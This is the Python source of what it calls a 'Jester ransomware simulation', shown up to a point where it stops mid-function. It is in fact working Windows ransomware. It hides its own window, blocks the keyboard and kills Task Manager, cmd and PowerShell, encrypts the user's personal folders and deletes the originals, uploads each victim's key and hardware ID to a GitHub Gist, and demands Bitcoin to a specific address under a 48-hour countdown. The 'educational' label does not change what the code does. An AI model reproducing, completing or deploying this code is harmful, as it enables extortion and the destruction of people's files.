# jester_ransomware.py
"""
JESTER RANSOMWARE SIMULATION - EDUCATIONAL PURPOSE ONLY
- 48-hour countdown timer
- Robust Bitcoin payment verification
- GitHub Gist integration
- HWID-based device tracking
- AES-256 CBC encryption
- Improved keyboard blocking with multiple layers
"""

import os
import sys
import time
import subprocess
import threading
import requests
import tkinter as tk
from tkinter import PhotoImage, ttk
from datetime import datetime, timedelta
from PIL import Image, ImageTk
from io import BytesIO
import ctypes
from ctypes import wintypes
import keyboard
import psutil
import winreg
import json
import hashlib
import base64
import wmi
import uuid
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import re
import pygame
import random
import queue
import time as time_module

# Initialize pygame mixer
pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=512)

# If this is the first run, restart as pythonw.exe
if not sys.executable.endswith('pythonw.exe'):
    try:
        pythonw_path = sys.executable.replace('python.exe', 'pythonw.exe')
        if not os.path.exists(pythonw_path):
            import glob
            possible_paths = glob.glob(os.path.join(os.path.dirname(sys.executable), '*pythonw.exe'))
            if possible_paths:
                pythonw_path = possible_paths[0]
            else:
                pythonw_path = sys.executable
        
        script_path = os.path.abspath(__file__)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        
        subprocess.Popen(
            [pythonw_path, script_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        sys.exit(0)
    except:
        pass

# Windows API constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

class KeyboardBlocker:
    """Multi-layer keyboard blocking system"""
    
    def __init__(self):
        self.blocked = True
        self.hook_id = None
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        
    def start_blocking(self):
        """Start keyboard blocking with multiple methods"""
        # Method 1: Low-level keyboard hook (most effective)
        self.setup_low_level_hook()
        
        # Method 2: Block specific key combinations
        self.block_key_combinations()
        
        # Method 3: Monitor and kill Task Manager
        self.monitor_task_manager()
    
    def setup_low_level_hook(self):
        """Set up low-level keyboard hook"""
        CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
        
        def hook_proc(nCode, wParam, lParam):
            if nCode >= 0:
                # Block all key presses
                if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
                    # Check if it's our secret key (Shift+H)
                    kbd_struct = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents
                    vk_code = (kbd_struct.value >> 16) & 0xFF
                    
                    # Allow Shift+H through (VK_H = 0x48)
                    if vk_code == 0x48 and (self.user32.GetKeyState(0x10) & 0x8000):
                        return self.user32.CallNextHookEx(self.hook_id, nCode, wParam, lParam)
                    
                    # Block everything else
                    return 1
            
            return self.user32.CallNextHookEx(self.hook_id, nCode, wParam, lParam)
        
        # Install the hook
        self.hook_proc = CMPFUNC(hook_proc)
        self.hook_id = self.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            self.hook_proc,
            self.kernel32.GetModuleHandleW(None),
            0
        )
        
        # Keep the hook running
        def message_loop():
            msg = wintypes.MSG()
            while self.blocked:
                if self.user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                    self.user32.TranslateMessage(ctypes.byref(msg))
                    self.user32.DispatchMessageW(ctypes.byref(msg))
                time_module.sleep(0.01)
        
        self.hook_thread = threading.Thread(target=message_loop, daemon=True)
        self.hook_thread.start()
    
    def block_key_combinations(self):
        """Block specific key combinations"""
        blocked_combinations = [
            'ctrl+alt+del', 'ctrl+shift+esc', 'alt+f4', 'ctrl+esc',
            'alt+tab', 'ctrl+alt+tab', 'win', 'win+r', 'win+e',
            'ctrl+shift+delete', 'ctrl+alt+delete'
        ]
        
        for combo in blocked_combinations:
            try:
                keyboard.add_hotkey(combo, lambda: None, suppress=True)
            except:
                pass
    
    def monitor_task_manager(self):
        """Monitor and block Task Manager"""
        def kill_task_manager():
            while self.blocked:
                try:
                    for proc in psutil.process_iter(['pid', 'name']):
                        if proc.info['name'] and 'taskmgr' in proc.info['name'].lower():
                            proc.kill()
                        # Block other dangerous processes
                        if proc.info['name'] and proc.info['name'].lower() in ['cmd.exe', 'powershell.exe', 'regedit.exe']:
                            proc.kill()
                except:
                    pass
                time_module.sleep(0.5)
        
        thread = threading.Thread(target=kill_task_manager, daemon=True)
        thread.start()
    
    def stop_blocking(self):
        """Stop keyboard blocking"""
        self.blocked = False
        if self.hook_id:
            self.user32.UnhookWindowsHookEx(self.hook_id)

class BitcoinPaymentVerifier:
    """Robust Bitcoin payment verification system"""
    
    def __init__(self, btc_address, euro_amount=20):
        self.btc_address = "bc1qgwzv6zmytzqja5cuf7ks76e5r0au8xdgh8akxk"
        self.euro_amount = euro_amount
        self.btc_amount = None
        self.update_btc_price()
        
        # Multiple API endpoints for redundancy
        self.apis = [
            self.verify_with_blockchain_info,
            self.verify_with_blockchair,
            self.verify_with_blockcypher,
            self.verify_with_blockstream
        ]
        
        # Cache for verified transactions
        self.verified_transactions = set()
        self.cache_file = os.path.join(os.environ['APPDATA'], '.btc_cache.json')
        self.load_cache()
        
    def update_btc_price(self):
        """Update BTC price from multiple sources"""
        price_sources = [
            "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=eur",
            "https://api.coinbase.com/v2/prices/BTC-EUR/spot",
            "https://blockchain.info/ticker"
        ]
        
        for source in price_sources:
            try:
                response = requests.get(source, timeout=5)
                if response.status_code == 200:
                    if "coingecko" in source:
                        btc_price = response.json()['bitcoin']['eur']
                    elif "coinbase" in source:
                        btc_price = float(response.json()['data']['amount'])
                    else:
                        btc_price = response.json()['EUR']['last']
                    
                    self.btc_amount = round(self.euro_amount / btc_price, 8)
                    return
            except:
                continue
        
        # Fallback value
        self.btc_amount = 0.00035
    
    def load_cache(self):
        """Load verified transactions cache"""
        try:
            if os.path.exists(self.cache_file):
                with open(self.cache_file, 'r') as f:
                    cache = json.load(f)
                    self.verified_transactions = set(cache.get('verified', []))
        except:
            pass
    
    def save_cache(self):
        """Save verified transactions cache"""
        try:
            with open(self.cache_file, 'w') as f:
                json.dump({'verified': list(self.verified_transactions)}, f)
        except:
            pass
    
    def verify_transaction(self, txid):
        """Verify transaction with multiple APIs"""
        txid = txid.strip()
        
        # Check format
        if not re.match(r'^[a-fA-F0-9]{64}$', txid):
            return False, "Invalid transaction ID format (must be 64 hex characters)"
        
        # Check cache first
        if txid in self.verified_transactions:
            return True, "Transaction already verified"
        
        # Try each API
        for api in self.apis:
            try:
                result, message, amount = api(txid)
                if result:
                    self.verified_transactions.add(txid)
                    self.save_cache()
                    
                    # Check if amount is sufficient
                    if amount >= self.btc_amount:
                        return True, f"Payment verified! Received: {amount} BTC"
                    else:
                        return False, f"Insufficient payment. Received: {amount} BTC, Required: {self.btc_amount} BTC"
            except Exception as e:
                continue
        
        return False, "Transaction not found on any blockchain explorer"
    
    def verify_with_blockchain_info(self, txid):
        """Verify using blockchain.info"""
        url = f"https://blockchain.info/rawtx/{txid}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            for out in data.get('out', []):
                if 'addr' in out and out['addr'] == self.btc_address:
                    amount = out['value'] / 100000000
                    return True, "Found on blockchain.info", amount
        
        raise Exception("Not found")
    
    def verify_with_blockchair(self, txid):
        """Verify using blockchair.com"""
        url = f"https://api.blockchair.com/bitcoin/raw/transaction/{txid}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and txid in data['data']:
                tx_data = data['data'][txid]
                
                for output in tx_data['decoded_raw_tx']['vout']:
                    if 'scriptPubKey' in output and 'addresses' in output['scriptPubKey']:
                        if self.btc_address in output['scriptPubKey']['addresses']:
                            amount = output['value']
                            return True, "Found on blockchair", amount
        
        raise Exception("Not found")
    
    def verify_with_blockcypher(self, txid):
        """Verify using blockcypher.com"""
        url = f"https://api.blockcypher.com/v1/btc/main/txs/{txid}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            for output in data.get('outputs', []):
                if 'addresses' in output and self.btc_address in output['addresses']:
                    amount = output['value'] / 100000000
                    return True, "Found on blockcypher", amount
        
        raise Exception("Not found")
    
    def verify_with_blockstream(self, txid):
        """Verify using blockstream.info"""
        url = f"https://blockstream.info/api/tx/{txid}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            for vout in data.get('vout', []):
                if 'scriptpubkey_address' in vout and vout['scriptpubkey_address'] == self.btc_address:
                    amount = vout['value'] / 100000000
                    return True, "Found on blockstream", amount
        
        raise Exception("Not found")

class AudioManager:
    """Continuous music playlist manager"""
    
    def __init__(self):
        self.song_files = ["song.mp3", "song1.mp3", "song2.mp3", "song3.mp3"]
        self.current_index = 0
        self.available_songs = []
        self.is_playing = False
        self.find_songs()
        
    def find_songs(self):
        """Find available song files"""
        search_paths = [
            os.path.dirname(sys.executable),
            os.path.dirname(os.path.abspath(__file__)),
            os.environ['TEMP'],
            os.environ['APPDATA'],
            os.getcwd()
        ]
        
        for song in self.song_files:
            for path in search_paths:
                song_path = os.path.join(path, song)
                if os.path.exists(song_path):
                    self.available_songs.append(song_path)
                    break
    
    def play(self):
        """Start continuous playback"""
        if not self.available_songs or self.is_playing:
            return
        
        self.is_playing = True
        
        def player():
            while self.is_playing:
                song = self.available_songs[self.current_index]
                try:
                    pygame.mixer.music.load(song)
                    pygame.mixer.music.play()
                    
                    while pygame.mixer.music.get_busy() and self.is_playing:
                        time_module.sleep(0.1)
                    
                    self.current_index = (self.current_index + 1) % len(self.available_songs)
                    time_module.sleep(0.5)
                    
                except:
                    self.current_index = (self.current_index + 1) % len(self.available_songs)
                    continue
        
        threading.Thread(target=player, daemon=True).start()
    
    def stop(self):
        """Stop playback"""
        self.is_playing = False
        if pygame.mixer.music.get_busy():
            pygame.mixer.music.stop()

class CryptoManager:
    """Handles encryption/decryption"""
    
    def __init__(self):
        self.key_size = 32
        self.iv_size = 16
        
    def generate_key(self):
        return get_random_bytes(self.key_size)
    
    def encrypt_data(self, data, key):
        iv = get_random_bytes(self.iv_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(iv + encrypted).decode()
    
    def decrypt_data(self, encrypted_data, key):
        try:
            raw = base64.b64decode(encrypted_data)
            iv = raw[:self.iv_size]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(raw[self.iv_size:]), AES.block_size)
            return decrypted.decode()
        except:
            return None
    
    def encrypt_file(self, file_path, key):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            encrypted = self.encrypt_data(data, key)
            
            new_path = file_path + '.jester'
            with open(new_path, 'w') as f:
                f.write(encrypted)
            
            os.remove(file_path)
            return True
        except:
            return False
    
    def decrypt_file(self, file_path, key):
        try:
            if not file_path.endswith('.jester'):
                return False
            
            with open(file_path, 'r') as f:
                encrypted = f.read()
            
            decrypted = self.decrypt_data(encrypted, key)
            if decrypted:
                original = file_path[:-7]
                with open(original, 'wb') as f:
                    f.write(decrypted.encode())
                os.remove(file_path)
                return True
        except:
            pass
        return False

class HWIDManager:
    """Hardware ID management"""
    
    def __init__(self):
        self.hwid = self.generate()
    
    def generate(self):
        try:
            components = [
                str(uuid.getnode()),
                self.get_processor_id(),
                self.get_disk_serial(),
                os.environ['COMPUTERNAME']
            ]
            combined = ''.join(components)
            return hashlib.sha256(combined.encode()).hexdigest()
        except:
            return hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
    
    def get_processor_id(self):
        try:
            c = wmi.WMI()
            for cpu in c.Win32_Processor():
                return cpu.ProcessorId.strip()
        except:
            return "UNKNOWN"
    
    def get_disk_serial(self):
        try:
            c = wmi.WMI()
            for disk in c.Win32_DiskDrive():
                return disk.SerialNumber.strip()
        except:
            return "UNKNOWN"

class GistManager:
    """GitHub Gist management"""
    
    def __init__(self, gist_id, encrypted_token, passphrase):
        self.gist_id = gist_id
        self.base_url = f"https://api.github.com/gists/{gist_id}"
        self.encrypted_token = encrypted_token
        self.passphrase = passphrase
        self.token = self.decrypt_token()
        self.headers = {
            "Authorization": f"token {self.token}",
            "Accept": "application/vnd.github.v3+json"
        }
        self.retry_queue = queue.Queue()
        self.start_retry_worker()
    
    def decrypt_token(self):
        try:
            salt = base64.b64decode(self.encrypted_token)[:8]
            encrypted = base64.b64decode(self.encrypted_token)[8:]
            
            key = hashlib.pbkdf2_hmac('sha256', self.passphrase.encode(), salt, 100000, 32)
            iv = encrypted[:16]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(encrypted[16:]), AES.block_size)
            return decrypted.decode()
        except:
            return None
    
    def start_retry_worker(self):
        """Start background worker for retrying failed operations"""
        def worker():
            while True:
                try:
                    operation, args, kwargs = self.retry_queue.get(timeout=1)
                    time_module.sleep(5)  # Wait before retry
                    operation(*args, **kwargs)
                except:
                    pass
        
        threading.Thread(target=worker, daemon=True).start()
    
    def api_call(self, method, *args, **kwargs):
        """Make API call with retry logic"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                if method == 'get':
                    response = requests.get(*args, **kwargs, timeout=10)
                elif method == 'patch':
                    response = requests.patch(*args, **kwargs, timeout=10)
                
                if response.status_code in [200, 201]:
                    return response.json()
                elif response.status_code == 403:
                    # Rate limited, wait longer
                    time_module.sleep(60)
                else:
                    time_module.sleep(2 ** attempt)
            except:
                if attempt == max_retries - 1:
                    return None
                time_module.sleep(2 ** attempt)
        return None
    
    def get_content(self):
        """Get gist content with retry"""
        result = self.api_call('get', self.base_url, headers=self.headers)
        if result and 'files' in result and 'keys.json' in result['files']:
            return json.loads(result['files']['keys.json']['content'])
        return {"devices": {}}
    
    def update_content(self, content):
        """Update gist content with retry"""
        data = {
            "files": {
                "keys.json": {
                    "content": json.dumps(content, indent=2)
                }
            }
        }
        result = self.api_call('patch', self.base_url, headers=self.headers, json=data)
        return result is not None
    
    def register_device(self, hwid, key, timer_end, data):
        """Register new device"""
        content = self.get_content()
        content["devices"][hwid] = {
            "key": base64.b64encode(key).decode(),
            "time": timer_end,
            "data": data,
            "registered": datetime.now().isoformat(),
            "paid": False
        }
        return self.update_content(content)
    
    def get_device(self, hwid):
        """Get device info"""
        content = self.get_content()
        return content.get("devices", {}).get(hwid)
    
    def mark_paid(self, hwid, txid):
        """Mark device as paid"""
        content = self.get_content()
        if hwid in content["devices"]:
            content["devices"][hwid]["paid"] = True
            content["devices"][hwid]["txid"] = txid
            content["devices"][hwid]["paid_time"] = datetime.now().isoformat()
            return self.update_content(content)
        return False
    
    def remove_device(self, hwid):
        """Remove device"""
        content = self.get_content()
        if hwid in content["devices"]:
            del content["devices"][hwid]
            return self.update_content(content)
        return False

class FileEncryptor:
    """File encryption with progress tracking"""
    
    def __init__(self, crypto, key):
        self.crypto = crypto
        self.key = key
        self.system_dirs = ['Windows', 'Program Files', 'ProgramData', 'System32', 'WinSxS']
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.bmp',
            '.mp3', '.mp4', '.avi', '.mov', '.wmv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.py', '.js', '.html', '.css', '.php',
            '.db', '.sql', '.mdb',
            '.cfg', '.conf', '.ini',
            '.bak', '.backup'
        ]
    
    def should_skip(self, path):
        path = path.lower()
        return any(d.lower() in path for d in self.system_dirs)
    
    def should_encrypt(self, filename):
        ext = os.path.splitext(filename)[1].lower()
        return ext in self.target_extensions and not filename.endswith('.jester')
    
    def encrypt_all(self, progress_callback=None):
        """Encrypt all user files"""
        targets = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Videos")
        ]
        
        # Count files first
        total = 0
        for target in targets:
            if os.path.exists(target):
                for root, _, files in os.walk(target):
                    if self.should_skip(root):
                        continue
                    total += sum(1 for f in files if self.should_encrypt(f))
        
        # Encrypt
        encrypted = []
        count = 0
        for target in targets:
            if os.path.exists(target):
                for root, _, files in os.walk(target):
                    if self.should_skip(root):
                        continue
                    for file in files:
                        if self.should_encrypt(file):
                            path = os.path.join(root, file)
                            if self.crypto.encrypt_file(path, self.key):
                                encrypted.append(path)
                                count += 1
                                if progress_callback:
                                    progress_callback(count, total, path)
        
        return encrypted

class TimerManager:
    """Persistent timer"""
    
    def __init__(self):
        self.file = os.path.join(os.environ['APPDATA'], '.jester_time')
        self.end = self.load()
    
    def load(self):
        try:
            if os.path.exists(self.file):
                with open(self.file, 'r') as f:
                    saved = float(f.read())
                    if saved > time.time():
                        return saved
        except:
            pass
        
        end = time.time() + (48 * 3600)
        try:
            with open(self.file, 'w') as f:
                f.write(str(end))
        except:
            pass
        return end
    
    def remaining(self):
        return max(0, self.end - time.time())
    
    def format(self):
        s = int(self.remaining())
        h = s // 3600
        m = (s % 3600) // 60
        s = s % 60
        return f"{h:02d}:{m:02d}:{s:02d}"

class JesterGUI:
    """Main GUI"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Jester")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        self.root.configure(bg='black')
        
        # Initialize components
        self.crypto = CryptoManager()
        self.hwid = HWIDManager()
        self.timer = TimerManager()
        self.audio = AudioManager()
        self.payment = BitcoinPaymentVerifier("bc1qgwzv6zmytzqja5cuf7ks76e5r0au8xdgh8akxk")
        self.gist = GistManager(
            "37415607d887851ee6e27738564425e7",
            "U2FsdGVkX1+6N2C3T2STrTzleUqq3UeYLO47nUBBZcMNIl51RsbjI92niqUdEj+rNAfpLcchha/Q9Ss3y21OSA==",
            "3e1d59e0-f2c3-4f83-8dfc-9e1df7601459"
        )
        
        # Keyboard blocker
        self.keyboard_blocker = KeyboardBlocker()
        self.keyboard_blocker.start_blocking()
        
        # State
        self.key = None
        self.paid = False
        self.secret_count = 0
        self.secret_timer = None
        
        # UI setup
        self.setup_ui()
        
        # Start animations and music
        self.animate()
        self.audio.play()
        
        # Check device
        self.check_device()
    
    def setup_ui(self):
        """Setup UI elements"""
        main = tk.Frame(self.root, bg='black')
        main.pack(expand=True, fill='both', padx=50, pady=50)
        
        # Timer
        self.timer_label = tk.Label(main, text=self.timer.format(),
                                   fg='red', bg='black',
                                   font=('Arial', 48, 'bold'))
        self.timer_label.pack(pady=10)
        
        # HWID
        tk.Label(main, text="Device ID:", fg='#666', bg='black',
                font=('Arial', 12)).pack()
        tk.Label(main, text=self.hwid.hwid[:20] + "...",
                fg='#888', bg='black', font=('Arial', 10)).pack()
        
        # Title
        self.title = tk.Label(main, text="", fg='white', bg='black',
                             font=('Arial', 72, 'bold'))
        self.title.pack(pady=20)
        
        # Image
        self.load_image(main)
        
        # Ransom message
        msg_frame = tk.Frame(main, bg='black', bd=2, relief='solid')
        msg_frame.pack(pady=20, padx=50, fill='x')
        
        self.msg = tk.Label(msg_frame,
            text="⚠️ YOUR FILES ARE ENCRYPTED ⚠️\n\n"
                 f"Send exactly {self.payment.btc_amount} BTC to:\n"
                 f"{self.payment.btc_address}\n\n"
                 "After payment, enter the transaction ID below.\n"
                 f"Time remaining: {self.timer.format()}",
            fg='red', bg='black', font=('Arial', 12, 'bold'),
            justify='center')
        self.msg.pack(pady=20, padx=20)
        
        # Transaction ID entry
        tx_frame = tk.Frame(main, bg='black')
        tx_frame.pack(pady=10)
        
        tk.Label(tx_frame, text="Transaction ID:", fg='yellow', bg='black',
                font=('Arial', 12, 'bold')).pack(side='left', padx=5)
        
        self.tx_entry = tk.Entry(tx_frame, font=('Arial', 10), width=50,
                                bg='#222', fg='white', insertbackground='white')
        self.tx_entry.pack(side='left', padx=5)
        
        self.verify_btn = tk.Button(tx_frame, text="VERIFY", 
                                    command=self.verify_payment,
                                    font=('Arial', 10, 'bold'),
                                    bg='orange', fg='black', bd=2)
        self.verify_btn.pack(side='left', padx=5)
        
        # Status
        self.status = tk.Label(main, text="", fg='yellow', bg='black',
                               font=('Arial', 10))
        self.status.pack(pady=5)
        
        # Key display (hidden)
        self.key_frame = tk.Frame(main, bg='black')
        self.key_frame.pack(pady=10)
        self.key_frame.pack_forget()
        
        tk.Label(self.key_frame, text="DECRYPTION KEY:",
                fg='lime', bg='black', font=('Arial', 14, 'bold')).pack()
        
        self.key_label = tk.Label(self.key_frame, text="", fg='lime', bg='black',
                                  font=('Courier', 14, 'bold'), wraplength=800)
        self.key_label.pack()
        
        # Decryption entry (hidden)
        self.decrypt_frame = tk.Frame(main, bg='black')
        self.decrypt_frame.pack(pady=5)
        self.decrypt_frame.pack_forget()
        
        tk.Label(self.decrypt_frame, text="Enter Key:",
                fg='green', bg='black', font=('Arial', 12, 'bold')).pack(side='left', padx=5)
        
        self.key_entry = tk.Entry(self.decrypt_frame, font=('Arial', 12), width=40,
                                  bg='#222', fg='white', insertbackground='white', show="*")
        self.key_entry.pack(side='left', padx=5)
        self.key_entry.bind('<Return>', lambda e: self.check_key())
        
        tk.Button(self.decrypt_frame, text="DECRYPT", command=self.check_key,
                 font=('Arial', 10, 'bold'), bg='green', fg='white', bd=2).pack(side='left', padx=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(main, length=500, mode='determinate')
        
        # Bind keys
        self.root.bind('<Key>', self.on_key)
    
    def load_image(self, parent):
        """Load Jester image"""
        try:
            url = "https://cdn.discordapp.com/attachments/1475178182033412158/1475179067534741606/IMG_3486.png"
            response = requests.get(url, timeout=10)
            img = Image.open(BytesIO(response.content))
            img = img.resize((250, 250), Image.Resampling.LANCZOS)
            self.photo = ImageTk.PhotoImage(img)
            tk.Label(parent, image=self.photo, bg='black').pack()
        except:
            tk.Label(parent, text="[Jester]", fg='white', bg='black',
                    font=('Arial', 24)).pack()
    
    def check_device(self):
        """Check device status"""
        info = self.gist.get_device(self.hwid.hwid)
        
        if info:
            self.key = base64.b64decode(info["key"])
            if info.get("paid"):
                self.paid = True
                self.show_key()
            else:
                self.status.config(text="⚠️ FILES ENCRYPTED - SEND PAYMENT")
        else:
            self.status.config(text="⚠️ ENCRYPTING FILES...")
            self.start_encryption()
    
    def start_encryption(self):
        """Start file encryption"""
        self.key = self.crypto.generate_key()
        
        def update_progress(current, total, file):
            self.progress['value'] = (current / total) * 100
            self.status.config(text=f"Encrypting: {os.path.basename(file)}")
            self.root.update()
        
        def encrypt():
            encryptor = FileEncryptor(self.crypto, self.key)
            files = encryptor.encrypt_all(update_progress)
            
            # Store file list
            file_list = [{"path": f, "size": os.path.getsize(f + '.jester')} for f in files]
            encrypted_data = self.crypto.encrypt_data(json.dumps(file_list), self.key)
            
            # Register device
            self.gist.register_device(
                self.hwid.hwid,
                self.key,
                self.timer.end,
                encrypted_data
            )
            
            self.progress.pack_forget()
            self.status.config(text="⚠️ ENCRYPTION COMPLETE - SEND PAYMENT")
        
        self.progress.pack(pady=10)
        threading.Thread(target=encrypt, daemon=True).start()
    
    def verify_payment(self):
        """Verify transaction ID"""
        txid = self.tx_entry.get().strip()
        
        if not txid:
            self.show_message("Enter transaction ID", "red")
            return
        
        self.verify_btn.config(state='disabled', text='VERIFYING...')
        self.root.update()
        
        verified, msg = self.payment.verify_transaction(txid)
        
        if verified:
            self.paid = True
            self.gist.mark_paid(self.hwid.hwid, txid)
            self.status.config(text=f"✅ {msg}", fg='green')
            self.show_message("Payment verified! Key below.", "green")
            self.show_key()
        else:
            self.status.config(text=f"❌ {msg}", fg='red')
            self.show_message("Verification failed", "red")
        
        self.verify_btn.config(state='normal', text='VERIFY')
    
    def show_key(self):
        """Show decryption key"""
        self.key_frame.pack(pady=10)
        self.decrypt_frame.pack(pady=5)
        
        key_hex = self.key.hex().upper()
        formatted = ' '.join(key_hex[i:i+4] for i in range(0, len(key_hex), 4))
        self.key_label.config(text=formatted)
        
        self.tx_entry.config(state='disabled')
        self.verify_btn.config(state='disabled')
    
    def check_key(self):
        """Check entered key"""
        entered = self.key_entry.get().replace(' ', '').replace('-', '')
        
        try:
            if bytes.fromhex(entered) == self.key:
                self.unlock()
            else:
                self.shake(self.key_entry)
                self.show_message("Invalid key", "red")
                self.key_entry.delete(0, tk.END)
        except:
            self.shake(self.key_entry)
            self.show_message("Invalid format", "red")
            self.key_entry.delete(0, tk.END)
    
    def unlock(self):
        """Unlock system"""
        self.status.config(text="✓ KEY ACCEPTED - DECRYPTING...")
        self.audio.stop()
        self.keyboard_blocker.stop_blocking()
        
        def decrypt():
            info = self.gist.get_device(self.hwid.hwid)
            if info and "data" in info:
                data = self.crypto.decrypt_data(info["data"], self.key)
                if data:
                    files = json.loads(data)
                    total = len(files)
                    
                    for i, f in enumerate(files):
                        path = f["path"] + '.jester'
                        if os.path.exists(path):
                            self.crypto.decrypt_file(path, self.key)
                            self.status.config(text=f"Decrypting: {i+1}/{total}")
                            self.root.update()
            
            self.gist.remove_device(self.hwid.hwid)
            self.show_message("Files restored! Exiting...", "green")
            self.root.after(3000, self.exit)
        
        threading.Thread(target=decrypt, daemon=True).start()
    
    def on_key(self, event):
        """Handle key presses"""
        if event.keysym.lower() == 'h' and event.state & 0x0001:
            self.secret_count += 1
            self.show_secret_feedback()
            
            if self.secret_timer:
                self.root.after_cancel(self.secret_timer)
            
            self.secret_timer = self.root.after(3000, self.reset_secret)
            
            if self.secret_count >= 3:
                self.emergency_unlock()
    
    def show_secret_feedback(self):
        """Show secret key counter"""
        label = tk.Label(self.root, text=str(self.secret_count),
                        fg='white', bg='black', font=('Arial', 72, 'bold'))
        label.place(relx=0.5, rely=0.5, anchor='center')
        
        def animate(step=0):
            if step > 20:
                label.destroy()
                return
            scale = 1.0 + (step / 10)
            label.config(font=('Arial', int(72 * scale), 'bold'))
            label.place(relx=0.5, rely=0.5 - step/100)
            label.after(25, lambda: animate(step + 1))
        
        animate()
    
    def reset_secret(self):
        self.secret_count = 0
    
    def emergency_unlock(self):
        """Emergency unlock with secret key"""
        if not self.key:
            return
        
        self.status.config(text="⚡ EMERGENCY DECRYPTION...")
        self.audio.stop()
        self.keyboard_blocker.stop_blocking()
        
        def decrypt():
            # Find all .jester files
            drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
            files = []
            
            for drive in drives:
                for root, _, filenames in os.walk(drive):
                    for f in filenames:
                        if f.endswith('.jester'):
                            files.append(os.path.join(root, f))
            
            total = len(files)
            for i, f in enumerate(files):
                self.crypto.decrypt_file(f, self.key)
                self.status.config(text=f"Decrypting: {i+1}/{total}")
                self.root.update()
            
            self.gist.remove_device(self.hwid.hwid)
            self.show_message("Emergency unlock complete!", "green")
            self.root.after(3000, self.exit)
        
        threading.Thread(target=decrypt, daemon=True).start()
    
    def show_message(self, text, color):
        """Show temporary message"""
        msg = tk.Label(self.root, text=text, fg=color, bg='black',
                      font=('Arial', 16, 'bold'))
        msg.place(relx=0.5, rely=0.85, anchor='center')
        
        def fade(alpha=1.0):
            if alpha <= 0:
                msg.destroy()
                return
            msg.config(fg=self.adjust_color(color, alpha))
            msg.after(100, lambda: fade(alpha - 0.2))
        
        self.root.after(2000, lambda: fade())
    
    def adjust_color(self, color, alpha):
        return color
    
    def shake(self, widget):
        """Shake animation"""
        x = widget.winfo_x()
        
        def move(step=0):
            if step > 10:
                widget.place(x=x)
                return
            offset = 5 if step % 2 == 0 else -5
            widget.place(x=x + offset)
            widget.after(50, lambda: move(step + 1))
        
        move()
    
    def animate(self):
        """Start animations"""
        self.animate_title()
        self.animate_fade()
        self.update_timer()
    
    def animate_title(self):
        """Typing animation"""
        self.title_text = ""
        self.title_index = 0
        self.full_title = "JESTER"
        
        def type_next():
            if self.title_index < len(self.full_title):
                self.title_text += self.full_title[self.title_index]
                self.title.config(text=self.title_text)
                self.title_index += 1
                self.title.after(200, type_next)
            else:
                self.title.after(2000, self.reset_title)
        
        type_next()
    
    def reset_title(self):
        self.title_text = ""
        self.title_index = 0
        self.animate_title()
    
    def animate_fade(self):
        """Fade animation"""
        alphas = [1.0, 0.9, 0.8, 0.7, 0.6, 0.5, 0.6, 0.7, 0.8, 0.9]
        self.fade_index = 0
        
        def fade():
            self.root.attributes('-alpha', alphas[self.fade_index])
            self.fade_index = (self.fade_index + 1) % len(alphas)
            self.root.after(100, fade)
        
        fade()
    
    def update_timer(self):
        """Update timer"""
        remaining = self.timer.remaining()
        
        if remaining <= 0:
            self.timer_label.config(text="00:00:00 - EXPIRED")
            self.handle_expired()
        else:
            self.timer_label.config(text=self.timer.format())
            self.msg.config(text=
                f"⚠️ YOUR FILES ARE ENCRYPTED ⚠️\n\n"
                f"Send exactly {self.payment.btc_amount} BTC to:\n"
                f"{self.payment.btc_address}\n\n"
                "After payment, enter the transaction ID below.\n"
                f"Time remaining: {self.timer.format()}")
            self.root.after(1000, self.update_timer)
    
    def handle_expired(self):
        """Handle timer expiration"""
        self.msg.config(text="⚠️ TIME EXPIRED - FILES ARE LOST FOREVER ⚠️")
        self.audio.stop()
        self.tx_entry.config(state='disabled')
        self.verify_btn.config(state='disabled')
        self.gist.remove_device(self.hwid.hwid)
        self.remove_from_startup()
    
    def remove_from_startup(self):
        """Remove from startup"""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
